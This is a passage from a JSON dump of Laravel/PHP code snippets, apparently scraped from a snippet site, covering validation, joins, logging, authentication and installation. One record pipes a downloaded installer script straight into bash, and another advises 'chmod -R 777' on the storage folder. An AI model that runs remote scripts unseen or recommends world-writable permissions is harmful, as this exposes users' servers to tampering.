    "description": "class CategoryController extends Controller {     public function show($slug)     {         $category = Category::with('posts')->where('slug', $slug)->firstOrFail();          if (view()->exists('category.custom.'.$category->slug)) {            $view = 'category.custom.'.$category->slug;        } else {             $view = 'category.show';        }          return view($view, [             'category' => $category,         ]);     } } \n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2407,
    "keyword": null,
    "link": null,
    "title": " laravel image validation",
    "description": "'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n$this->validate($request, ['file' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',]); \n$validate = Validator::make($params = $request->all(), [   'type' => 'required',   'files' => 'mimes:jpeg,png,jpg,svg,doc,docx,odt,pdf,tex,txt,wpd,tiff,tif,csv,psd,key,odp,pps,ppt,pptx,ods,xls,xlsm,xlsx' ]);\n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2408,
    "keyword": null,
    "link": null,
    "title": " laravel in array blade",
    "description": "@if(in_array($val, $array)) \n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2409,
    "keyword": null,
    "link": null,
    "title": " laravel include config",
    "description": "config()->set('config.path', $value);\nuse Illuminate\\Support\\Facades\\Config;\n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2410,
    "keyword": null,
    "link": null,
    "title": " laravel include with variable",
    "description": "@include('layouts.article', ['mainTitle' => \"404, page not found\", 'mainContent' => \"sorry, but the requested page does not exist :(\"])\n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2411,
    "keyword": null,
    "link": null,
    "title": " laravel init",
    "description": "curl -s https://laravel.build/your-project-name-here | bash\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2412,
    "keyword": null,
    "link": null,
    "title": " laravel inline if",
    "description": "{{ $var == \"hello\" ? \"Hi\" : \"Goodbye\" }}\n//in blade: {{ ($data->position == 1) ? 'active' : 'disable'}}  //in Controller $result = ($data->status == 1) ? 'active' : 'disable'\n{{$var == 'hello' ? 'Hi' : ($var == 'bye' ? 'Goodbye' : 'another option')}}\n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2413,
    "keyword": null,
    "link": null,
    "title": " laravel insert",
    "description": "DB::table('users')->insert([     'email' => 'kayla@example.com',     'votes' => 0 ]);\n$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\nDistrictModel::insert([                 'code' => $data->code,                 'name' => $data->name,                 'region_id' => $data->region_id,                 'sorting' => $data->sorting,             ]);\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2414,
    "keyword": null,
    "link": null,
    "title": " laravel insert or ignore",
    "description": "<?php DB::table('users')->insertOrIgnore([     ['id' => 1, 'email' => 'taylor@example.com'],     ['id' => 2, 'email' => 'dayle@example.com'] ]); \n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2415,
    "keyword": null,
    "link": null,
    "title": " laravel insert timestamp now",
    "description": "Information::create([   'data_now'=>Carbon\\Carbon::now() ])\n",
    "reg_date": "2021-10-12T10:16:13.000Z"
  },
  {
    "id": 2416,
    "keyword": null,
    "link": null,
    "title": " laravel instal",
    "description": "composer global require laravel/installer  laravel new example-app  php artisan serve\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2417,
    "keyword": null,
    "link": null,
    "title": " laravel install production",
    "description": "composer install --optimize-autoloader --no-dev\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2418,
    "keyword": null,
    "link": null,
    "title": " laravel installation in windows",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\nYou can create project by 2 ways:  First is installing it without defining version: composer create-project laravel/laravel yourProjectName  Secondly you can install by defining version: composer create-project laravel/laravel=\"VersionOfYourChoice\" yourProjectName\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\ncomposer global require \"laravel/installer=~1.1\"\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2419,
    "keyword": null,
    "link": null,
    "title": " laravel inverse seeder",
    "description": "// use \" orangehill/iseed \" to generate seeder file from database composer require orangehill/iseed // install then,  php artisan iseed my_table,another_table // or,  php artisan iseed my_table --classnameprefix=Customized\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2420,
    "keyword": null,
    "link": null,
    "title": " laravel invoice toturial",
    "description": "$ composer require laraveldaily/laravel-invoices\nuse LaravelDaily\\Invoices\\Invoice; use LaravelDaily\\Invoices\\Classes\\Buyer; use LaravelDaily\\Invoices\\Classes\\InvoiceItem;  <...>          $customer = new Buyer([             'name'          => 'John Doe',             'custom_fields' => [                 'email' => 'test@example.com',             ],         ]);          $item = (new InvoiceItem())->title('Service 1')->pricePerUnit(2);          $invoice = Invoice::make()             ->buyer($customer)             ->discountByPercent(10)             ->taxRate(15)             ->shipping(1.99)             ->addItem($item);          return $invoice->stream();\n$ php artisan invoices:install\n$ php artisan invoices:update\nuse LaravelDaily\\Invoices\\Invoice; use LaravelDaily\\Invoices\\Classes\\Party; use LaravelDaily\\Invoices\\Classes\\InvoiceItem;  <...>          $client = new Party([             'name'          => 'Roosevelt Lloyd',             'phone'         => '(520) 318-9486',             'custom_fields' => [                 'note'        => 'IDDQD',                 'business id' => '365#GG',             ],         ]);          $customer = new Party([             'name'          => 'Ashley Medina',             'address'       => 'The Green Street 12',             'code'          => '#22663214',             'custom_fields' => [                 'order number' => '> 654321 <',             ],         ]);          $items = [             (new InvoiceItem())->title('Service 1')->pricePerUnit(47.79)->quantity(2)->discount(10),             (new InvoiceItem())->title('Service 2')->pricePerUnit(71.96)->quantity(2),             (new InvoiceItem())->title('Service 3')->pricePerUnit(4.56),             (new InvoiceItem())->title('Service 4')->pricePerUnit(87.51)->quantity(7)->discount(4)->units('kg'),             (new InvoiceItem())->title('Service 5')->pricePerUnit(71.09)->quantity(7)->discountByPercent(9),             (new InvoiceItem())->title('Service 6')->pricePerUnit(76.32)->quantity(9),             (new InvoiceItem())->title('Service 7')->pricePerUnit(58.18)->quantity(3)->discount(3),             (new InvoiceItem())->title('Service 8')->pricePerUnit(42.99)->quantity(4)->discountByPercent(3),             (new InvoiceItem())->title('Service 9')->pricePerUnit(33.24)->quantity(6)->units('m2'),             (new InvoiceItem())->title('Service 11')->pricePerUnit(97.45)->quantity(2),             (new InvoiceItem())->title('Service 12')->pricePerUnit(92.82),             (new InvoiceItem())->title('Service 13')->pricePerUnit(12.98),             (new InvoiceItem())->title('Service 14')->pricePerUnit(160)->units('hours'),             (new InvoiceItem())->title('Service 15')->pricePerUnit(62.21)->discountByPercent(5),             (new InvoiceItem())->title('Service 16')->pricePerUnit(2.80),             (new InvoiceItem())->title('Service 17')->pricePerUnit(56.21),             (new InvoiceItem())->title('Service 18')->pricePerUnit(66.81)->discountByPercent(8),             (new InvoiceItem())->title('Service 19')->pricePerUnit(76.37),             (new InvoiceItem())->title('Service 20')->pricePerUnit(55.80),         ];          $notes = [             'your multiline',             'additional notes',             'in regards of delivery or something else',         ];         $notes = implode(\"<br>\", $notes);          $invoice = Invoice::make('receipt')             ->series('BIG')             ->sequence(667)             ->serialNumberFormat('{SEQUENCE}/{SERIES}')             ->seller($client)             ->buyer($customer)             ->date(now()->subWeeks(3))             ->dateFormat('m/d/Y')             ->payUntilDays(14)             ->currencySymbol('$')             ->currencyCode('USD')             ->currencyFormat('{SYMBOL}{VALUE}')             ->currencyThousandsSeparator('.')             ->currencyDecimalPoint(',')             ->filename($client->name . ' ' . $customer->name)             ->addItems($items)             ->notes($notes)             ->logo(public_path('vendor/invoices/sample-logo.png'))             // You can additionally save generated invoice to configured disk             ->save('public');                      $link = $invoice->url();         // Then send email to party with link          // And return invoice itself to browser or have a different view         return $invoice->stream();\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2421,
    "keyword": null,
    "link": null,
    "title": " laravel is route name",
    "description": "Route::currentRouteName()\nrequest()->route()->getName()\nRoute::getCurrentRoute()->getActionName();\n// Check if route is *** Request::route()->named(\"YourRouteNameView\")\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2422,
    "keyword": null,
    "link": null,
    "title": " laravel jetstream",
    "description": "php artisan jetstream:install livewire  php artisan jetstream:install livewire --teams \ncomposer require laravel/jetstream \nlaravel new project-name --jet\n# follow the below link https://www.techiediaries.com/laravel-8-auth-scaffolding-jetstream-inertiajs-livewire/     \nphp artisan jetstream:install inertia  php artisan jetstream:install inertia --teams \n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2423,
    "keyword": null,
    "link": null,
    "title": " laravel join",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n$users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\nDB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.id', 'contacts.phone', 'orders.price')             ->get();\n $customer = DB::table('customers')                 ->join('shops', 'customers.shop_id', '=', 'shops.shop_id')                 ->where('customer_contact', $contact_no)                 ->get();\n$latestPosts = DB::table('posts')                    ->select('user_id', DB::raw('MAX(created_at) as last_post_created_at'))                    ->where('is_published', true)                    ->groupBy('user_id');  $users = DB::table('users')         ->joinSub($latestPosts, 'latest_posts', function ($join) {             $join->on('users.id', '=', 'latest_posts.user_id');         })->get();\n",
    "reg_date": "2021-10-12T10:16:14.000Z"
  },
  {
    "id": 2424,
    "keyword": null,
    "link": null,
    "title": " laravel join query sum example",
    "description": "$users = User::select('users*', 'analytics.*', DB::raw('SUM(analytics.revenue) As revenue'))          ->leftJoin('analytics', 'analytics.user_id', '=', 'users.id')          ->where('analytics.date', Carbon::today()->toDateString())          ->get();\n$users = User::select('users*', 'analytics.*', DB::raw('SUM(analytics.revenue) As revenue'))          ->leftJoin('analytics', 'analytics.user_id', '=', 'users.id')          ->where('analytics.date', Carbon::today()->toDateString())          ->get(); \n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2425,
    "keyword": null,
    "link": null,
    "title": " laravel join table",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n$users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\nDB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.id', 'contacts.phone', 'orders.price')             ->get();\n $customer = DB::table('customers')                 ->join('shops', 'customers.shop_id', '=', 'shops.shop_id')                 ->where('customer_contact', $contact_no)                 ->get();\n$subCategories = Subcategory::join('categories', 'subcategories.category_id', '=', 'categories.id')                               ->select('subcategories.*', 'categories.name AS cname')                               ->orderBy('id', 'desc')                               ->get(); \n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2426,
    "keyword": null,
    "link": null,
    "title": " laravel jwt",
    "description": "composer require tymon/jwt-auth \nphp artisan jwt:secret\n    $ composer require tymon/jwt-auth:dev-develop --prefer-source \nphp artisan vendor:publish --provider=\"Tymon\\JWTAuth\\Providers\\LaravelServiceProvider\" \n'providers' => [      ...      Tymon\\JWTAuth\\Providers\\LaravelServiceProvider::class, ] \ncomposer create-project laravel/laravel laravel-jwt-auth --prefer-dist\n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2427,
    "keyword": null,
    "link": null,
    "title": " laravel jwt user create",
    "description": "<?php  namespace App\\Http\\Controllers;  use Illuminate\\Support\\Facades\\Auth; use Illuminate\\Http\\Request; use Validator; use App\\User;   class AuthController extends Controller {      /**      * Create a new AuthController instance.      *      * @return void      */     public function __construct() {         $this->middleware('auth:api', ['except' => ['login', 'register']]);     }      /**      * Get a JWT via given credentials.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function login(Request $request){     \t$validator = Validator::make($request->all(), [             'email' => 'required|email',             'password' => 'required|string|min:6',         ]);          if ($validator->fails()) {             return response()->json($validator->errors(), 422);         }          if (! $token = auth()->attempt($validator->validated())) {             return response()->json(['error' => 'Unauthorized'], 401);         }          return $this->createNewToken($token);     }      /**      * Register a User.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function register(Request $request) {         $validator = Validator::make($request->all(), [             'name' => 'required|string|between:2,100',             'email' => 'required|string|email|max:100|unique:users',             'password' => 'required|string|confirmed|min:6',         ]);          if($validator->fails()){             return response()->json($validator->errors()->toJson(), 400);         }          $user = User::create(array_merge(                     $validator->validated(),                     ['password' => bcrypt($request->password)]                 ));          return response()->json([             'message' => 'User successfully registered',             'user' => $user         ], 201);     }       /**      * Log the user out (Invalidate the token).      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function logout() {         auth()->logout();          return response()->json(['message' => 'User successfully signed out']);     }      /**      * Refresh a token.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function refresh() {         return $this->createNewToken(auth()->refresh());     }      /**      * Get the authenticated User.      *      * @return \\Illuminate\\Http\\JsonResponse      */     public function userProfile() {         return response()->json(auth()->user());     }      /**      * Get the token array structure.      *      * @param  string $token      *      * @return \\Illuminate\\Http\\JsonResponse      */     protected function createNewToken($token){         return response()->json([             'access_token' => $token,             'token_type' => 'bearer',             'expires_in' => auth()->factory()->getTTL() * 60,             'user' => auth()->user()         ]);     }  }\n'providers' => [      ...      Tymon\\JWTAuth\\Providers\\LaravelServiceProvider::class, ] \n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2428,
    "keyword": null,
    "link": null,
    "title": " laravel limit foreach",
    "description": "@foreach ($element['subs']->slice(0, 10) as $item)  ...Code @endforeach \n@foreach ($users->slice(0, 5) as $user)    {{$user->option1}} <br>  @endforeach  \n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2429,
    "keyword": null,
    "link": null,
    "title": " laravel link storage to public",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2430,
    "keyword": null,
    "link": null,
    "title": " laravel list all routes",
    "description": "php artisan route:list\n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2431,
    "keyword": null,
    "link": null,
    "title": " laravel list routes",
    "description": "php artisan route:list\nphp artisan route:list --name=<Term>\n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2432,
    "keyword": null,
    "link": null,
    "title": " laravel livewire bootstrap modal",
    "description": "<button type=\"button\" class=\"btn btn-primary\" data-toggle=\"modal\" data-target=\"#exampleModal\"> \tOpen Form </button>  <!-- Modal --> <div wire:ignore.self class=\"modal fade\" id=\"exampleModal\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalLabel\" aria-hidden=\"true\">     <div class=\"modal-dialog\" role=\"document\">         <div class=\"modal-content\">             <div class=\"modal-header\">                 <h5 class=\"modal-title\" id=\"exampleModalLabel\">Modal title</h5>                 <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">                      <span aria-hidden=\"true close-btn\">&times;</span>                 </button>             </div>            <div class=\"modal-body\">                 <form>                     <div class=\"form-group\">                         <label for=\"exampleFormControlInput1\">Name</label>                         <input type=\"text\" class=\"form-control\" id=\"exampleFormControlInput1\" placeholder=\"Enter Name\" wire:model=\"name\">                         @error('name') <span class=\"text-danger error\">{{ $message }}</span>@enderror                     </div>                     <div class=\"form-group\">                         <label for=\"exampleFormControlInput2\">Email address</label>                         <input type=\"email\" class=\"form-control\" id=\"exampleFormControlInput2\" wire:model=\"email\" placeholder=\"Enter Email\">                         @error('email') <span class=\"text-danger error\">{{ $message }}</span>@enderror                     </div>                 </form>             </div>             <div class=\"modal-footer\">                 <button type=\"button\" class=\"btn btn-secondary close-btn\" data-dismiss=\"modal\">Close</button>                 <button type=\"button\" wire:click.prevent=\"store()\" class=\"btn btn-primary close-modal\">Save changes</button>             </div>         </div>     </div> </div>\n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2433,
    "keyword": null,
    "link": null,
    "title": " laravel livewire livewire.js 404 not found",
    "description": "/* in Laravel livewire.js can be 404 not found because your  root directory is not set on default to make it work: 1. go to config/livewire.php => find 'asset_url' and set it to your  \tpublic folder, for example:      'asset_url'  => \"http://localhost/{you project's name}/public\", 2.now run these command in command panel \tphp artisan config:cache     php artisan view:clear     php artisan vendor:publish --tag=livewire:config  these command just refreshing everything to make the changes come in effect 3.now try it.....i hope it will help */\n",
    "reg_date": "2021-10-12T10:16:15.000Z"
  },
  {
    "id": 2434,
    "keyword": null,
    "link": null,
    "title": " laravel livewire select2 multi select",
    "description": "######## INSIDE LIVEWIRE COMPONENT public array $locationUsers = []; protected $listeners = ['locationUsersSelected'];  public function locationUsersSelected($locationUsersValues) {   $this->locationUsers = $locationUsersValues; }  ######## INSIDE LIVEWIRE BLADE <div class=\"col-md-12 mb-3\" wire:ignore> \t<label for=\"locationUsers\">Select Users</label> \t<select id=\"locationUsers\" class=\"form-control select2\" multiple=\"multiple\"> \t\t<option value=\"\">--select--</option>         @foreach($this->users as $id => $name)         \t<option value=\"{{ $id }}\">{{ $name }}</option>         @endforeach \t</select> </div>  ######## INSIDE LIVEWIRE SCRIPTS document.addEventListener('livewire:load', function () {   $('#locationUsers').on('select2:select', (e) => {     @this.emit('locationUsersSelected', $('#locationUsers').select2('val'));   });    $('#locationUsers').val(@this.get('locationUsers')).trigger('change'); });\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2435,
    "keyword": null,
    "link": null,
    "title": " laravel load models by id array",
    "description": "$models = Model::findMany([1, 2, 3]);\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2436,
    "keyword": null,
    "link": null,
    "title": " laravel load view in variable",
    "description": "$html = view('users.edit', compact('user'))->render(); \nreturn View::make('blog')->with('posts', $posts);\nRoute::get('/', function () {     return view('greeting', ['name' => 'James']); });\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2437,
    "keyword": null,
    "link": null,
    "title": " laravel log",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nLOG_CHANNEL=daily\nuse Illuminate\\Support\\Facades\\Log;  Log::info(json_encode($user);\nuse Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nLog::info('This is some useful information.');  Log::warning('Something could be going wrong.');  Log::error('Something is really going wrong.');\nuse Monolog\\Logger;  $orderLog = new Logger('order'); $orderLog->pushHandler(new StreamHandler(storage_path('logs/mylogs.log')), Logger::INFO); $orderLog->info(\"Order id: ${orderId}\");\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2438,
    "keyword": null,
    "link": null,
    "title": " laravel log daily",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nLOG_CHANNEL=daily\nuse Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Monolog\\Logger;  $orderLog = new Logger('order'); $orderLog->pushHandler(new StreamHandler(storage_path('logs/mylogs.log')), Logger::INFO); $orderLog->info(\"Order id: ${orderId}\");\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2439,
    "keyword": null,
    "link": null,
    "title": " laravel log path",
    "description": "storage/logs/laravel.log\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2440,
    "keyword": null,
    "link": null,
    "title": " laravel log permission denied mac",
    "description": "sudo chmod -R 777 storage/*\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2441,
    "keyword": null,
    "link": null,
    "title": " laravel log to console",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::info(\"the message for log\");\nerror_log('Some message here.');\n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2442,
    "keyword": null,
    "link": null,
    "title": " laravel logger",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Illuminate\\Support\\Facades\\Log;  Log::info(json_encode($user);\nuse Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Monolog\\Logger;  $orderLog = new Logger('order'); $orderLog->pushHandler(new StreamHandler(storage_path('logs/mylogs.log')), Logger::INFO); $orderLog->info(\"Order id: ${orderId}\");\nLog::info(print_r($user, true));\ncomposer require spatie/laravel-activitylog \n",
    "reg_date": "2021-10-12T10:16:16.000Z"
  },
  {
    "id": 2443,
    "keyword": null,
    "link": null,
    "title": " laravel logout",
    "description": "//make a route as a post and button should look like this  <form action=\"{{ route('logout') }}\" method=\"post\">        @csrf        <button type=\"submit\">Logout</button> </form> //Controller will be like this. public function store(){         auth()->logout();         return redirect()->route('home');     }\nif (!Auth::user()->isActive()) {     Auth::logout();      return Redirect::home(); }\nAuth::logout();\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\npublic function logout (Request $request) { $accessToken = auth()->user()->token(); $token= $request->user()->tokens->find($accessToken); $token->revoke(); return response(['message' => 'You have been successfully logged out.'], 200); }\ncomposer require laravel/ui --dev php artisan ui vue --auth \n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2444,
    "keyword": null,
    "link": null,
    "title": " laravel logout redirect",
    "description": "This is how I did it. In Auth\\LoginController you have:  use AuthenticatesUsers; Change it to:  use AuthenticatesUsers {     logout as performLogout; } Then, define a new logout() method in your LoginController:  public function logout(Request $request) {     $this->performLogout($request);     return redirect()->route('your_route'); } Sure, regular logout() method in that trait has only 3 lines (used to log users out of the system) so you can copy them to your method, but you should always follow the DRY principle (don't repeat yourself) and re-use as much code as you can.\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2445,
    "keyword": null,
    "link": null,
    "title": " laravel logs",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Illuminate\\Support\\Facades\\Log;  Log::info(json_encode($user);\nuse Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nLog::info('This is some useful information.');  Log::warning('Something could be going wrong.');  Log::error('Something is really going wrong.');\nuse Monolog\\Logger;  $orderLog = new Logger('order'); $orderLog->pushHandler(new StreamHandler(storage_path('logs/mylogs.log')), Logger::INFO); $orderLog->info(\"Order id: ${orderId}\");\nuse Illuminate\\Support\\Facades\\Log;  // Severity levels base on RFC5424 commented on the right side Log::emergency($message);\t// system is unusable Log::alert($message);\t\t// action must be taken immediately Log::critical($message);\t// critical conditions Log::error($message);\t\t// error conditions Log::warning($message);\t\t// warning conditions Log::notice($message);\t\t// normal but significant condition Log::info($message);\t\t// informational messages Log::debug($message);\t\t// debug-level messages  // Checkout RFC5424 here - https://tools.ietf.org/html/rfc5424\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2446,
    "keyword": null,
    "link": null,
    "title": " laravel loop through collection",
    "description": "$users = App\\User::where('active', 1)->get();  foreach ($users as $user) {     echo $user->name; }\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2447,
    "keyword": null,
    "link": null,
    "title": " laravel loop variable",
    "description": "@foreach ($users as $user)     @if ($loop->first)         This is the first iteration.     @endif      @if ($loop->last)         This is the last iteration.     @endif      <p>This is user {{ $user->id }}</p> @endforeach\n<ul> @foreach ($pages as $page)     <li>{{ $loop->iteration }}: {{ $page->title }}         @if ($page->hasChildren())         <ul>         @foreach ($page->children() as $child)             <li>{{ $loop->parent->iteration }}.{{ $loop->iteration }}:                 {{ $child->title }}</li>         @endforeach         </ul>         @endif     </li> @endforeach </ul>\nProperty\t\t\tDescription $loop->index\t\tThe index of the current loop iteration (starts at 0). $loop->iteration\tThe current loop iteration (starts at 1). $loop->remaining\tThe iterations remaining in the loop. $loop->count\t\tThe total number of items in the array being iterated. $loop->first\t\tWhether this is the first iteration through the loop. $loop->last\t\t\tWhether this is the last iteration through the loop. $loop->even\t\t\tWhether this is an even iteration through the loop. $loop->odd\t\t\tWhether this is an odd iteration through the loop. $loop->depth\t\tThe nesting level of the current loop. $loop->parent\t\tWhen in a nested loop, the parent's loop variable.\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2448,
    "keyword": null,
    "link": null,
    "title": " laravel mail success or failure",
    "description": "/**  *  Send Mail from Parts Specification Form  */ public function sendMail(Request $request) {     $data = $request->all();      $messageBody = $this->getMessageBody($data);      Mail::raw($messageBody, function ($message) {         $message->from('yourEmail@domain.com', 'Learning Laravel');         $message->to('goper.zosa@gmail.com');         $message->subject('Learning Laravel test email');     });      // check for failures     if (Mail::failures()) {         // return response showing failed emails     }      // otherwise everything is okay ...     return redirect()->back(); } \n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2449,
    "keyword": null,
    "link": null,
    "title": " laravel make:auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\ncomposer require laravel/ui php artisan ui vue --auth\ncomposer require laravel/ui php artisan ui vue --auth php artisan migrate \ncomposer require laravel/ui php artisan ui vue --auth \nLaravel's laravel/ui package provides a quick way to scaffold all of the routes and views you need for authentication using a few simple commands:  composer require laravel/ui  php artisan ui vue --auth\nAuth::user();\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2450,
    "keyword": null,
    "link": null,
    "title": " laravel make:listner",
    "description": "php artisan make:event PodcastProcessedEvent php artisan make:listener PodcastProcessedListener --event=PodcastProcessedEvent\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2451,
    "keyword": null,
    "link": null,
    "title": " laravel make:request messages",
    "description": "public function rules() {     return [         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]; }  public function messages() {     return [         'title.required' => 'A title is required',         'body.required' => 'A message is required',     ]; }\n",
    "reg_date": "2021-10-12T10:16:17.000Z"
  },
  {
    "id": 2452,
    "keyword": null,
    "link": null,
    "title": " laravel makeHidden",
    "description": "$patient_recommend_sms =PatientRecommendationSms:: where('patient_id' , $patient_id) ->get() ->makeHidden(['created_at','updated_at' , 'schedule_at' , 'sent_at']);\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2453,
    "keyword": null,
    "link": null,
    "title": " laravel make auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\n//Run the bolow commands to install laravel ui package composer require laravel/ui php artisan ui vue --auth npm install && npm run dev\ncomposer require laravel/ui php artisan ui vue --auth\n$userId = Auth::id();\ncomposer require laravel/ui php artisan ui vue --auth \nLaravel's laravel/ui package provides a quick way to scaffold all of the routes and views you need for authentication using a few simple commands:  composer require laravel/ui  php artisan ui vue --auth\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
